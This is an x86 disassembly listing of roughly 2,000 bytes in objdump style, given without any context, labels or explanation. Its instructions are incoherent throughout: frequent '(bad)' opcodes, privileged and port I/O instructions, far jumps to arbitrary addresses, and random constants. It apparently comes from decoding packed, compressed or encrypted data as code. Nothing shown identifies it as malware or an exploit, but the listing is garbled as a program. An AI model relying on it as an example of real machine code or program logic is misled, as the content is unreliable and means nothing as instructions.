  42f0f6:	out    0x3,eax
  42f0f8:	jne    0x42f0cd
  42f0fa:	pop    ebx
  42f0fb:	jg     0x42f093
  42f0fd:	and    ch,al
  42f0ff:	add    esi,DWORD PTR [ebp-0x2d]
  42f102:	ins    DWORD PTR es:[edi],dx
  42f103:	mov    ebp,0xe0ffd2af
  42f108:	mov    edi,0x279c0
  42f10d:	add    BYTE PTR [eax],al
  42f10f:	add    BYTE PTR [eax],al
  42f111:	hlt    
  42f112:	lea    esp,[ebx]
  42f114:	xor    DWORD PTR [ecx+0x2],0x8df43800
  42f11b:	and    esi,ebp
  42f11d:	jno    0x42f121
  42f11f:	add    BYTE PTR [eax],bh
  42f121:	loope  0x42f0f7
  42f123:	and    al,BYTE PTR [edi-0x3d107715]
  42f129:	pop    es
  42f12a:	cmc    
  42f12b:	punpckldq mm3,DWORD PTR [eax]
  42f12e:	mov    dl,al
  42f130:	adc    DWORD PTR [esi+esi*2+0x7efe66fa],0x30035eb2
  42f13b:	xlat   BYTE PTR ds:[ebx]
  42f13c:	pop    edi
  42f13d:	mov    dl,0x26
  42f13f:	je     0x42f12c
  42f141:	inc    ebx
  42f142:	test   DWORD PTR [esi+0x387beb47],ebx
  42f148:	popf   
  42f149:	sbb    bh,ch
  42f14b:	or     bl,BYTE PTR [esi+esi*1+0x37]
  42f14f:	mov    edi,0xf978fade
  42f154:	es jmp 0x42f1d2
  42f157:	jae    0x42f11e
  42f159:	adc    cl,BYTE PTR [eax+0x6ba301da]
  42f15f:	cli    
  42f160:	push   cs
  42f161:	daa    
  42f162:	pop    eax
  42f163:	push   edx
  42f164:	adc    edi,ecx
  42f166:	push   0xfffffffa
  42f168:	dec    BYTE PTR [esi]
  42f16a:	std    
  42f16b:	stc    
  42f16c:	idiv   al
  42f16e:	lea    esi,[ebx-0x3b]
  42f171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f172:	push   0xfffffff6
  42f174:	mov    edx,0x0
  42f179:	add    dl,ch
  42f17b:	jnp    0x42f103
  42f17d:	adc    al,0xc9
  42f17f:	cmovo  ebp,ecx
  42f182:	dec    ebx
  42f183:	test   DWORD PTR [ebx],esp
  42f185:	jmp    0x42f401
  42f18a:	pop    esp
  42f18b:	(bad)  
  42f18c:	ror    BYTE PTR [ebx+0x400980b1],1
  42f192:	pushf  
  42f193:	dec    ebx
  42f194:	push   esi
  42f195:	and    al,0x80
  42f197:	sbb    bh,dh
  42f199:	(bad)  
  42f19a:	js     0x42f206
  42f19c:	inc    esi
  42f19d:	dec    ebx
  42f19f:	dec    esp
  42f1a0:	push   esi
  42f1a1:	and    al,0x54
  42f1a3:	sbb    bh,dh
  42f1a5:	(bad)  
  42f1a6:	push   0xdbff426a
  42f1ab:	add    BYTE PTR [edi],bh
  42f1ad:	and    al,0x4c
  42f1af:	pushf  
  42f1b0:	ficom  DWORD PTR [ebx-0x1e]
  42f1b3:	lea    ecx,[ebx+0x4a6c3844]
  42f1b9:	call   FWORD PTR [edx-0x1bdb8101]
  42f1bf:	push   es
  42f1c0:	add    BYTE PTR [eax],al
  42f1c2:	mov    ah,0x88
  42f1c4:	(bad)  
  42f1c7:	(bad)  
  42f1c8:	ds and al,0xdc
  42f1cb:	fwait
  42f1cc:	cmp    dl,dl
  42f1ce:	jno    0x42f15d
  42f1d0:	push   ebp
  42f1d1:	pop    esi
  42f1d2:	pop    es
  42f1d3:	sti    
  42f1d4:	jecxz  0x42f233
  42f1d6:	dec    edi
  42f1d7:	dec    DWORD PTR [edx-0x13]
  42f1da:	(bad)  
  42f1db:	mov    WORD PTR ds:0xf,es
  42f1e1:	add    BYTE PTR [eax],al
  42f1e3:	fwait
  42f1e4:	cmp    edi,0xffffffff
  42f1e7:	sbb    al,0x8f
  42f1e9:	push   ds
  42f1ea:	xchg   ebp,eax
  42f1eb:	adc    eax,0x8c003c49
  42f1f0:	mov    esp,DWORD PTR ds:0xf783d274
  42f1f6:	sub    ch,BYTE PTR [eax+0x6c]
  42f1f9:	jp     0x42f1c4
  42f1fb:	lods   al,BYTE PTR ds:[esi]
  42f1fc:	xor    edi,0x61
  42f1ff:	jecxz  0x42f182
  42f201:	pop    esi
  42f202:	add    esp,ebx
  42f204:	add    eax,DWORD PTR [eax-0x32c8a07]
  42f20a:	sbb    BYTE PTR [esi],0x6a
  42f20d:	(bad)  
  42f20e:	dec    DWORD PTR [edi+0x5d]
  42f211:	xchg   edi,eax
  42f212:	std    
  42f213:	sbb    al,0x5f
  42f215:	es mov edi,0xc57e9aff
  42f21b:	push   ebp
  42f21c:	jmp    0x726a52a9
  42f221:	jle    0x42f218
  42f223:	pshufw mm0,QWORD PTR [esi+edi*1+0x7ffe6974],0x7c
  42f22c:	push   ebx
  42f22d:	sti    
  42f22e:	test   BYTE PTR [edx+0x6a],al
  42f231:	(bad)  
  42f232:	(bad)  
  42f233:	fist   WORD PTR [esi+0x26]
  42f236:	mov    edi,0xadbf1f5
  42f23b:	clc    
  42f23c:	inc    edx
  42f23d:	std    
  42f23e:	push   DWORD PTR [ebp+0x53]
  42f241:	hlt    
  42f242:	push   edi
  42f243:	ss jmp 0x431cce
  42f249:	add    BYTE PTR [eax],al
  42f24b:	add    BYTE PTR [edx-0x12],bh
  42f24e:	jmp    0x18ac6753
  42f253:	adc    ebx,DWORD PTR [ebp-0x310780d4]
  42f259:	mov    dh,0x2
  42f25b:	lea    dx,[ecx+0x5d3485bf]
  42f262:	fidivr WORD PTR [ebx]
  42f264:	xchg   esp,eax
  42f265:	fwait
  42f266:	add    bh,BYTE PTR [edi+ecx*4]
  42f269:	xchg   edi,eax
  42f26a:	out    0x7f,al
  42f26c:	or     al,0x59
  42f26e:	or     al,BYTE PTR ds:0x79c611f5
  42f274:	imul   ebp,ecx,0xffffff85
  42f277:	sub    DWORD PTR [ecx+0x72],ebp
  42f27a:	jle    0x42f274
  42f27c:	cwde   
  42f27d:	push   0x6975eb81
  42f282:	(bad)  
  42f283:	gs jle 0x42f288
  42f286:	inc    ecx
  42f287:	xbegin 0x8f26decd
  42f28d:	loope  0x42f2e5
  42f28f:	add    BYTE PTR [ecx+0x3a9452fc],al
  42f295:	jns    0x42f28f
  42f297:	pop    es
  42f298:	js     0x42f21c
  42f29a:	mov    edi,0x68682ccd
  42f29f:	lea    ecx,[esi+esi*8-0x39]
  42f2a3:	test   BYTE PTR [ebp+0x12a81d2c],bl
  42f2a9:	jns    0x42f274
  42f2ab:	cli    
  42f2ac:	imul   cl
  42f2ae:	xchg   ecx,eax
  42f2af:	mov    eax,DWORD PTR [eax]
  42f2b1:	add    BYTE PTR [eax],al
  42f2b3:	add    BYTE PTR [eax],al
  42f2b5:	jg     0x42f238
  42f2b7:	(bad)  
  42f2b8:	into   
  42f2b9:	push   es
  42f2ba:	or     eax,0xdaf8d69
  42f2bf:	fs push ebp
  42f2c1:	push   0x7e
  42f2c3:	call   0xa61d70e5
  42f2c8:	push   ds
  42f2c9:	jns    0x42f2a5
  42f2cb:	and    eax,0xd3e04d84
  42f2d0:	call   eax
  42f2d2:	sbb    BYTE PTR [ecx+0x187bc2c6],dh
  42f2d8:	or     BYTE PTR [eax-0x7e],dh
  42f2db:	aas    
  42f2dc:	int    0xac
  42f2de:	pop    ss
  42f2df:	outs   dx,DWORD PTR ds:[esi]
  42f2e0:	lds    edi,FWORD PTR [esi+0x22]
  42f2e3:	cmc    
  42f2e4:	and    al,0x93
  42f2e6:	push   es
  42f2e7:	in     eax,dx
  42f2e8:	and    DWORD PTR [edi+0x488d690b],esp
  42f2ee:	or     eax,0x7e0a8564
  42f2f3:	call   0x261d4f15
  42f2f8:	test   ch,bh
  42f2fa:	sub    eax,0x7d917ff2
  42f2ff:	stc    
  42f300:	mov    ch,BYTE PTR [edx+0x7b]
  42f303:	push   DWORD PTR [ebp+0x7fb872]
  42f309:	sar    ebp,0xf8
  42f30c:	lock addr16 loope 0x42f375
  42f310:	cld    
  42f311:	sahf   
  42f312:	mov    ebp,0xfe099f0a
  42f317:	mov    ch,0xb9
  42f319:	add    BYTE PTR [eax],al
  42f31b:	add    BYTE PTR [eax],al
  42f31d:	add    BYTE PTR [esi-0x7a17003e],al
  42f323:	aam    0x7f
  42f325:	rcl    BYTE PTR [ebx-0x67bc680a],0xd5
  42f32c:	mov    esi,0x7f4244de
  42f331:	popa   
  42f332:	(bad)  
  42f333:	int    0x3f
  42f335:	jmp    0x346e9b0
  42f33a:	cdq    
  42f33b:	aad    0xbe
  42f33d:	imul   ebp,ecx,0xf68e741c
  42f343:	jns    0x42f37f
  42f345:	hlt    
  42f346:	cmp    ah,BYTE PTR [edi+ebp*8-0x1a]
  42f34a:	les    edx,FWORD PTR [edx+0x7f]
  42f34d:	xor    esp,DWORD PTR [esi]
  42f34f:	int    0x3f
  42f351:	jmp    0xd346e9cc
  42f356:	push   eax
  42f357:	aad    0xbe
  42f359:	imul   esi,ecx,0xf109741b
  42f35f:	jns    0x42f39b
  42f361:	mov    esp,0xeeef641e
  42f366:	les    edx,FWORD PTR [edx+0x7f]
  42f369:	jae    0x42f351
  42f36b:	int3   
  42f36c:	aas    
  42f36d:	jmp    0x694feae8
  42f372:	add    DWORD PTR [esp+esi*2],ebx
  42f375:	icebp  
  42f376:	idiv   BYTE PTR [ecx+0x3a]
  42f379:	popf   
  42f37a:	jnp    0x42f3a9
  42f37c:	shr    BYTE PTR [ecx+0x488e33],0x0
  42f383:	add    BYTE PTR [eax],al
  42f385:	add    BYTE PTR [eax],al
  42f387:	fdiv   st(0),st
  42f389:	mov    ecx,0xb9d7dc42
  42f38e:	inc    edx
  42f38f:	int3   
  42f390:	mov    bh,0xb9
  42f392:	inc    edx
  42f393:	int3   
  42f394:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f395:	mov    ecx,0xb997dc42
  42f39a:	inc    edx
  42f39b:	fsub   QWORD PTR [esi]
  42f39d:	les    eax,FWORD PTR [edx-0x34]
  42f3a0:	daa    
  42f3a1:	les    eax,FWORD PTR [edx-0x34]
  42f3a4:	dec    esi
  42f3a5:	mov    esi,0xbe6e9c42
  42f3aa:	inc    edx
  42f3ab:	pushf  
  42f3ac:	cmc    
  42f3ad:	mov    esi,0xbefb8c42
  42f3b2:	inc    edx
  42f3b3:	mov    ecx,gs
  42f3b5:	mov    esi,0xbecc9c42
  42f3ba:	inc    edx
  42f3bb:	pushf  
  42f3bc:	int3   
  42f3bd:	mov    esi,0xbeb08c42
  42f3c2:	inc    edx
  42f3c3:	mov    WORD PTR [esi+edi*4-0x7cd2a3be],ss
  42f3ca:	in     al,dx
  42f3cb:	fbld   TBYTE PTR [edx+0x5af883f2]
  42f3d1:	or     DWORD PTR [ebp+0x3c],0x445d8337
  42f3d8:	xor    al,BYTE PTR [ebx-0x78b99010]
  42f3de:	inc    esp
  42f3df:	jo     0x42f44f
  42f3e1:	xchg   DWORD PTR [eax+esi*2+0x76],eax
  42f3e5:	xchg   DWORD PTR [eax+eax*4+0x6a],eax
  42f3e9:	xchg   DWORD PTR [eax+eax*1+0x0],eax
  42f3ed:	add    BYTE PTR [eax],al
  42f3ef:	add    BYTE PTR [eax+0x72],dh
  42f3f2:	test   BYTE PTR [esi+0x43],al
  42f3f5:	clc    
  42f3f6:	ds and al,0x17
  42f3f9:	sbb    BYTE PTR [esi+0x24],0x7
  42f3fd:	or     ecx,DWORD PTR [edi-0x75]
  42f400:	jmp    0x754a6278
  42f405:	pop    eax
  42f406:	mov    esi,0xfe7a79e8
  42f40b:	(bad)  
  42f40c:	clc    
  42f40d:	xor    cl,BYTE PTR [ebx]
  42f40f:	inc    ebp
  42f410:	jmp    FWORD PTR [ebx-0x2537c03]
  42f416:	xlat   BYTE PTR ds:[ebx]
  42f417:	jg     0x42f3f5
  42f419:	addr16 adc cl,ch
  42f41c:	cmc    
  42f41d:	(bad)  
  42f41e:	cli    
  42f41f:	jae    0x42f3f2
  42f421:	jmp    0xb48c04ab
  42f426:	jle    0x42f420
  42f428:	js     0x42f400
  42f42a:	in     al,dx
  42f42b:	xchg   BYTE PTR [esi],dh
  42f42d:	popa   
  42f42e:	jns    0x42f3ef
  42f430:	and    DWORD PTR [eax-0x665d3685],ebx
  42f436:	jns    0x42f3f7
  42f438:	and    DWORD PTR [eax+0x4d6a417c],esp
  42f43e:	jg     0x42f44b
  42f440:	jb     0x42f433
  42f442:	inc    eax
  42f443:	adc    ecx,DWORD PTR [esi+0x6987dad4]
  42f449:	popa   
  42f44a:	jbe    0x42f48d
  42f44c:	mov    bh,BYTE PTR [eax-0x47a3c042]
  42f452:	in     eax,dx
  42f453:	inc    DWORD PTR [eax]
  42f455:	add    BYTE PTR [eax],al
  42f457:	add    BYTE PTR [eax],al
  42f459:	(bad)  
  42f45a:	fild   WORD PTR [eax+0x1]
  42f45d:	cdq    
  42f45e:	mov    ebx,0x64fc0409
  42f463:	ficomp DWORD PTR [ebx]
  42f465:	mov    DWORD PTR [ecx],ebx
  42f467:	or     eax,DWORD PTR [esp+ebp*8]
  42f46a:	push   esp
  42f46b:	ficom  DWORD PTR [ebx]
  42f46d:	mov    DWORD PTR [ebp-0x3e],esi
  42f470:	or     DWORD PTR [edx+0x517b756d],ebp
  42f476:	or     DWORD PTR [ebx+0x3],esi
  42f479:	jb     0x42f45d
  42f47b:	add    ah,BYTE PTR [eax*4+0x59243ae2]
  42f482:	add    bl,dh
  42f484:	mov    edi,DWORD PTR [edi-0x7a]
  42f487:	mov    eax,edi
  42f489:	add    bh,BYTE PTR [ebx+0x68]
  42f48c:	or     DWORD PTR [edx+edi*1+0x5f],esi
  42f490:	call   0x414506fc
  42f495:	jno    0x42f418
  42f497:	jp     0x42f498
  42f499:	loop   0x42f4d5
  42f49b:	call   0x4dc662a3
  42f4a0:	clc    
  42f4a1:	sar    BYTE PTR [edx+0x6d],cl
  42f4a4:	or     DWORD PTR [ebp+0xb],edi
  42f4a7:	xchg   ebx,eax
  42f4a8:	ds je  0x42f475
  42f4ab:	mov    WORD PTR gs:[ecx+0xb],?
  42f4af:	(bad)  
  42f4b0:	out    0x82,eax
  42f4b2:	add    ch,cl
  42f4b4:	xchg   BYTE PTR [esi-0x7b],dl
  42f4b7:	jmp    0x42f467
  42f4b9:	pusha  
  42f4ba:	add    ch,BYTE PTR [ecx-0x75]
  42f4bd:	add    BYTE PTR [eax],al
  42f4bf:	add    BYTE PTR [eax],al
  42f4c1:	add    BYTE PTR [ecx+0xb],ch
  42f4c4:	gs out 0x7f,eax
  42f4c7:	add    ch,cl
  42f4c9:	add    DWORD PTR [ebx+0x647fea07],0xb
  42f4d0:	jmp    0xe666e9d8
  42f4d5:	cmp    BYTE PTR [edx+ecx*1+0x6bc8382],0x7a
  42f4dd:	jp     0x42f553
  42f4df:	sub    BYTE PTR [ebp+0x3c],0x6e
  42f4e3:	jle    0x42f47a
  42f4e5:	add    eax,0x880d0275
  42f4ea:	repnz add BYTE PTR [ebx],ah
  42f4ed:	ds je  0x42f503
  42f4f0:	ds dec ebp
  42f4f2:	mov    edx,0xf6f6db7d
  42f4f7:	dec    eax
  42f4f8:	jmp    0x3dc56a00
  42f4fd:	cli    
  42f4fe:	outs   dx,DWORD PTR ds:[esi]
  42f4ff:	jg     0x42f500
  42f501:	sbb    bh,BYTE PTR es:[edx-0x6]
  42f505:	daa    
  42f506:	push   ebx
  42f507:	add    esi,DWORD PTR [ebx]
  42f509:	adc    dl,BYTE PTR [eax+0xbecf6f9]
  42f50f:	xchg   al,al
  42f511:	jecxz  0x42f589
  42f513:	add    al,BYTE PTR [eax-0x7af310ee]
  42f519:	sbb    bh,ch
  42f51b:	jns    0x42f517
  42f51d:	push   0x6d
  42f51f:	push   ds
  42f520:	adc    al,0xe9
  42f522:	sbb    ah,al
  42f524:	add    BYTE PTR [ebx+0x0],bh
  42f52a:	add    BYTE PTR [edx-0x32d17982],al
  42f530:	jle    0x42f4f1
  42f532:	push   ebp
  42f533:	popf   
  42f534:	adc    BYTE PTR [ebx+0xd],0xc5
  42f538:	or     BYTE PTR [ebx+0x5],0xa9
  42f53c:	and    dh,al
  42f53e:	sbb    BYTE PTR [esi],ch
  42f540:	dec    ebx
  42f541:	cli    
  42f542:	cdq    
  42f543:	cmc    
  42f544:	mov    ecx,0xc31ce373
  42f549:	adc    al,BYTE PTR ds:0x71040df5
  42f54f:	dec    eax
  42f550:	adc    eax,0x25922786
  42f555:	jnp    0x42f5b8
  42f557:	cmp    bl,BYTE PTR [esi]
  42f559:	or     ebx,esi
  42f55b:	cmc    
  42f55c:	idiv   edi
  42f55e:	call   0xc5a6eed9
  42f563:	push   edx
  42f564:	jns    0x42f54d
  42f566:	cs bnd jnp 0x42f564
  42f56a:	imul   edi,edi,0x4b6d0b18
  42f570:	or     eax,0x6ff6e900
  42f575:	or     dh,ah
  42f577:	mov    edx,0x76e9067b
  42f57c:	inc    esp
  42f57d:	inc    ecx
  42f57e:	add    BYTE PTR ds:0x632ce75a,bl
  42f584:	xor    ch,0x80
  42f587:	addr16 jnp 0x42f58f
  42f58a:	test   ebx,ebp
  42f58c:	add    eax,DWORD PTR [eax]
  42f58e:	add    BYTE PTR [eax],al
  42f590:	add    BYTE PTR [eax],al
  42f592:	add    BYTE PTR [eax],al
  42f594:	xchg   BYTE PTR [edi-0x46],dh
  42f597:	call   0xf45d2aa
  42f59c:	mov    DWORD PTR [ebp-0x4923ffff],ebx
  42f5a2:	inc    eax
  42f5a3:	add    DWORD PTR [esp+ebx*8-0x7b198af6],esi
  42f5aa:	js     0x42f5c2
  42f5ac:	leave  
  42f5ad:	or     BYTE PTR [ebx+esi*1],al
  42f5b0:	pushf  
  42f5b1:	pushf  
  42f5b2:	stc    
  42f5b3:	xor    bl,BYTE PTR [esi+edi*4]
  42f5b6:	mov    edi,0x3e7adbe0
  42f5bb:	and    al,0xd3
  42f5bd:	cld    
  42f5be:	inc    eax
  42f5bf:	pop    ss
  42f5c0:	pop    ss
  42f5c1:	aaa    
  42f5c2:	adc    BYTE PTR [ebp-0x74f4ee24],al
  42f5c8:	sar    BYTE PTR [esi-0x36],cl
  42f5cb:	xor    DWORD PTR [ebp+edi*8+0x6f540a73],0xffffff83
  42f5d3:	stos   DWORD PTR es:[edi],eax
  42f5d4:	add    BYTE PTR [eax+eax*1],0x80
  42f5d8:	xchg   edx,eax
  42f5d9:	test   BYTE PTR [esi+eax*2-0x778aa785],al
  42f5e0:	cwde   
  42f5e1:	bound  eax,QWORD PTR ds:0xf8b0d80f
  42f5e7:	jmp    ebx
  42f5e9:	stc    
  42f5ea:	ds and al,0x3c
  42f5ed:	pop    ebx
  42f5ee:	inc    ebx
  42f5ef:	or     al,0xf5
  42f5f1:	fadd   QWORD PTR ds:0x43fb5c00
  42f5f7:	or     al,0x0
  42f5f9:	add    BYTE PTR [eax],al
  42f5fb:	add    BYTE PTR [eax],al
  42f5fd:	addr16 ret 0x1023
  42f601:	jne    0x42f5e7
  42f603:	xor    DWORD PTR [esi+esi*2],ecx
  42f606:	sahf   
  42f607:	out    dx,al
  42f608:	cwde   
  42f609:	inc    bl
  42f60b:	jbe    0x42f650
  42f60d:	pop    ecx
  42f60e:	adc    DWORD PTR [ecx+0x41],edi
  42f611:	ins    DWORD PTR es:[edi],dx
  42f612:	je     0x42f5c7
  42f614:	jb     0x42f67b
  42f616:	mov    ebx,0x45b136fc
  42f61b:	(bad)  
  42f61c:	outs   dx,BYTE PTR ds:[esi]
  42f61d:	ins    DWORD PTR es:[edi],dx
  42f61e:	hlt    
  42f61f:	mov    bl,0x88
  42f621:	test   eax,0x7de6ca45
  42f626:	in     al,0x2f
  42f628:	and    al,0x9d
  42f62a:	repnz pop es
  42f62c:	and    al,0xa9
  42f62e:	in     al,dx
  42f62f:	pop    es
  42f630:	and    al,0x7d
  42f632:	imul   ecx,DWORD PTR [ecx],0xdae5fe08
  42f638:	paddb  mm3,mm5
  42f63b:	fist   WORD PTR [edi]
  42f63d:	mov    gs,WORD PTR [ebx+0x15914be7]
  42f643:	ja     0x42f686
  42f645:	jge    0x42f62b
  42f647:	cmp    ah,BYTE PTR [eax*4-0x5defc512]
  42f64e:	repnz cmp ah,BYTE PTR [eax*4+0x7e083ce4]
  42f656:	stos   BYTE PTR es:[edi],al
  42f657:	jne    0x42f6a2
  42f659:	jns    0x42f6cb
  42f65b:	jns    0x42f5f2
  42f65d:	jo     0x42f6c8
  42f65f:	inc    cl
  42f661:	add    BYTE PTR [eax],al
  42f663:	add    BYTE PTR [eax],al
  42f665:	add    BYTE PTR [ebx],dh
  42f667:	push   0xffffffc4
  42f669:	cmp    BYTE PTR [ecx-0xef519c3],bh
  42f66f:	sub    al,0x82
  42f671:	cli    
  42f672:	(bad)  
  42f673:	hlt    
  42f674:	add    DWORD PTR [eax],ecx
  42f676:	out    dx,al
  42f677:	daa    
  42f678:	lock test BYTE PTR ds:0xa186d16d,dh
  42f67f:	add    cl,BYTE PTR ds:0x4c5fbec
  42f685:	hlt    
  42f686:	xchg   ebx,eax
  42f687:	dec    esp
  42f688:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f689:	xor    bh,dl
  42f68b:	inc    edi
  42f68c:	dec    ecx
  42f68d:	mov    bl,0xf1
  42f68f:	inc    ecx
  42f690:	mov    esp,0xd1bff8f9
  42f695:	fcomip st,st(4)
  42f697:	add    eax,0xfb47beb
  42f69c:	pop    edi
  42f69d:	cmp    eax,0x7ba21e66
  42f6a2:	mov    dh,0x1e
  42f6a4:	jmp    0xef84:0x11cbf1f4
  42f6ab:	add    BYTE PTR [edi+ebx*8-0xaeffd7e],0xdc
  42f6b3:	jbe    0x42f6ae
  42f6b5:	and    bl,0x4
  42f6b8:	loop   0x42f739
  42f6ba:	nop
  42f6bb:	add    eax,0x7af503e9
  42f6c0:	out    dx,al
  42f6c1:	adc    bh,cl
  42f6c3:	cmp    ah,ch
  42f6c5:	add    esi,DWORD PTR [ebp-0x74]
  42f6c8:	sub    bl,BYTE PTR [ebx]
  42f6ca:	add    BYTE PTR [eax],al
  42f6cc:	add    BYTE PTR [eax],al
  42f6ce:	add    BYTE PTR [ecx-0x74],bl
  42f6d1:	fmul   QWORD PTR ds:0x3f31d9c
  42f6d7:	jne    0x42f719
  42f6d9:	and    al,BYTE PTR ds:0x88f18b9a
  42f6df:	pop    DWORD PTR [esi]
  42f6e1:	and    edi,DWORD PTR gs:[eax+0x2]
  42f6e5:	jmp    0xb1b9a378
  42f6ea:	mov    DWORD PTR [edx-0x4b722113],edi
  42f6f0:	or     eax,0x37e84c5
  42f6f5:	jno    0x42f6c1
  42f6f7:	xchg   DWORD PTR [eax-0xa6ee4de],ecx
  42f6fd:	jmp    DWORD PTR [eax+0x3d]
  42f700:	and    cl,BYTE PTR [ebx]
  42f702:	fdivrp st(2),st
  42f704:	jnp    0x42f711
  42f706:	jmp    0x5867481
  42f70b:	popa   
  42f70c:	sbb    eax,0x6b36e545
  42f711:	fbstp  TBYTE PTR [esi+0x2]
  42f715:	add    BYTE PTR [edx+0x3d],0xef
  42f719:	add    eax,0xfd1e6f73
  42f71e:	in     eax,0x79
  42f720:	mov    al,BYTE PTR [ecx]
  42f722:	inc    edx
  42f723:	and    al,0xf6
  42f725:	imul   BYTE PTR [edi+eiz*2+0x76ec3f7f]
  42f72c:	add    al,BYTE PTR [eax+0x414372cf]
  42f732:	test   DWORD PTR [eax],0x0
  42f738:	jo     0x42f77a
  42f73a:	inc    ecx
  42f73b:	jmp    0x6b80:0xe8414078
  42f742:	(bad)  
  42f743:	in     eax,0x76
  42f745:	add    al,BYTE PTR [eax+0x49f573c7]
  42f74b:	icebp  
  42f74c:	div    esp
  42f74e:	dec    ecx
  42f74f:	in     eax,dx
  42f750:	div    ebp
  42f752:	mul    bl
  42f754:	stos   BYTE PTR es:[edi],al
  42f755:	mov    DWORD PTR [edi-0x2e],edi
  42f758:	test   esi,ebp
  42f75a:	sub    BYTE PTR [ecx+0x23],0xbd
  42f75e:	or     ah,BYTE PTR [esp+eax*4+0x7]
  42f762:	add    cl,ch
  42f764:	cmp    al,0xc3
  42f766:	add    ah,ah
  42f768:	sbb    esi,ebp
  42f76a:	cli    
  42f76b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f76c:	div    ebp
  42f76e:	div    BYTE PTR ds:0xe88b7f66
  42f774:	jbe    0x42f778
  42f776:	ret    0x7027
  42f779:	add    cl,ch
  42f77b:	add    al,ch
  42f77d:	add    eax,0xf4cc0000
  42f782:	dec    esi
  42f783:	psraw  mm6,QWORD PTR [edi-0x1]
  42f787:	call   FWORD PTR [ebx+ecx*8+0x40]
  42f78b:	add    DWORD PTR [ebx-0x1a],edx
  42f78e:	je     0x42f79c
  42f790:	dec    esp
  42f791:	add    DWORD PTR [eax-0x7af01305],eax
  42f797:	push   0xc600011d
  42f79c:	add    BYTE PTR [eax],al
  42f79e:	add    BYTE PTR [eax],al
  42f7a0:	add    dl,dl
  42f7a2:	std    
  42f7a3:	pop    es
  42f7a4:	jmp    0x42fced
  42f7a9:	pushf  
  42f7aa:	hlt    
  42f7ab:	and    eax,0xff5b910f
  42f7b0:	dec    DWORD PTR [ebx+ecx*8]
  42f7b3:	inc    eax
  42f7b4:	add    DWORD PTR ds:0xdc0c50e6,eax
  42f7ba:	add    BYTE PTR [ebp+0x935ac43],cl
  42f7c0:	ja     0x42f7c0
  42f7c2:	push   0x5
  42f7c4:	mov    esi,0xe8796b8f
  42f7c9:	or     al,0x6b
  42f7cb:	xchg   DWORD PTR [esi-0x54],eax
  42f7ce:	retf   0x140
  42f7d1:	(bad)  
  42f7d2:	out    0x34,eax
  42f7d4:	or     al,0xcc
  42f7d6:	add    BYTE PTR [eax+0x76d7afb],al
  42f7dc:	(bad)  
  42f7dd:	push   edx
  42f7de:	add    DWORD PTR [ebx],eax
  42f7e0:	jmp    0x430a6d
  42f7e5:	or     al,0xf7
  42f7e7:	sub    bh,BYTE PTR [esi+esi*2+0x7e]
  42f7eb:	icebp  
  42f7ec:	cmp    DWORD PTR [ebx+0x1d],ebx
  42f7ef:	pop    esi
  42f7f0:	mov    edx,DWORD PTR [edx+0xe]
  42f7f3:	pop    esi
  42f7f4:	imul   ecx,esp,0x3
  42f7f7:	pop    esi
  42f7f8:	pcmpeqw mm1,mm3
  42f7fb:	dec    esp
  42f7fc:	popa   
  42f7fd:	jbe    0x42f7a9
  42f7ff:	in     eax,0x7e
  42f801:	dec    ebp
  42f802:	mov    edx,0x88e8
  42f807:	add    BYTE PTR [eax],al
  42f809:	add    BYTE PTR [ebx+0x76e2b559],dh
  42f80f:	imul   edi,esi,0x10aa8e61
  42f815:	add    BYTE PTR [eax+0x71],0xfe
  42f819:	(bad)  
  42f81a:	out    dx,eax
  42f81b:	fwait
  42f81c:	pop    ss
  42f81d:	and    al,0xfe
  42f81f:	pop    ebp
  42f820:	or     ebp,ecx
  42f822:	sbb    eax,0xf0fffe56
  42f827:	test   al,0x4e
  42f829:	cmp    ebp,DWORD PTR [esp+ebp*4+0x69]
  42f82d:	popa   
  42f82e:	sub    bl,0x44
  42f831:	popa   
  42f832:	test   cl,0x33
  42f835:	(bad)  
  42f836:	in     al,dx
  42f837:	mov    ds:0x6ab3c214,eax
  42f83c:	or     ch,cl
  42f83e:	enter  0xfe60,0xff
  42f842:	cmc    
  42f843:	adc    BYTE PTR [esi*2+0xc6236c],ah
  42f84a:	push   0x75064912
  42f84f:	imul   edi,DWORD PTR [esi-0xa],0x7f41e585
  42f856:	mov    esi,0x53c00122
  42f85b:	lock enter 0x1b0d,0xc0
  42f860:	inc    ebx
  42f861:	add    eax,0xc6c05413
  42f866:	sbb    ebp,DWORD PTR [eax+0x3d]
  42f869:	popa   
  42f86a:	not    BYTE PTR [ecx+0x2e]
  42f86d:	bound  eax,QWORD PTR [eax]
  42f86f:	add    BYTE PTR [eax],al
  42f871:	add    BYTE PTR [eax],al
  42f873:	cld    
  42f874:	and    edx,DWORD PTR [edx]
  42f876:	out    0xec,eax
  42f878:	(bad)  
  42f879:	ret    
  42f87a:	iret   
  42f87b:	inc    ecx
  42f87c:	add    dh,al
  42f87e:	clc    
  42f87f:	popa   
  42f880:	fsub   st(1),st
  42f882:	shl    DWORD PTR [ebx],0xdc
  42f885:	imul   ebx,DWORD PTR gs:[edx-0x7936a024],0x3c
  42f88d:	sub    al,BYTE PTR [ebx]
  42f88f:	outs   dx,DWORD PTR ds:[esi]
  42f890:	imul   esi,DWORD PTR [eax+0xc],0x7c690275
  42f897:	push   0x3
  42f899:	add    BYTE PTR gs:[edx+0x2],bh
  42f89d:	jmp    0x54ead2f
  42f8a2:	nop
  42f8a3:	jle    0x42f8ab
  42f8a5:	inc    eax
  42f8a6:	in     eax,dx
  42f8a7:	jle    0x42f8ab
  42f8a9:	jmp    0x4955c3c
  42f8ae:	or     esp,DWORD PTR [esi-0x4b733ce4]
  42f8b4:	push   cs
  42f8b5:	retf   
  42f8b6:	in     al,dx
  42f8b7:	retf   0xc307
  42f8ba:	adc    BYTE PTR [edi+0x34048a46],bh
  42f8c0:	fsub   QWORD PTR [ebp+0x6b]
  42f8c3:	mov    ds:0x750409b9,al
  42f8c8:	add    al,BYTE PTR [ebx-0x74f1cb76]
  42f8ce:	cmp    al,0xb4
  42f8d0:	jmp    0x3e9:0x7346a2c
  42f8d7:	add    BYTE PTR [eax],al
  42f8d9:	add    BYTE PTR [eax],al
  42f8db:	add    ch,dh
  42f8dd:	jbe    0x42f8bd
  42f8df:	neg    DWORD PTR [eax+0x4111dd82]
  42f8e5:	punpckhwd mm7,QWORD PTR [ebx-0x6e]
  42f8e9:	in     eax,dx
  42f8ea:	nop
  42f8eb:	inc    esi
  42f8ec:	xor    al,0x1
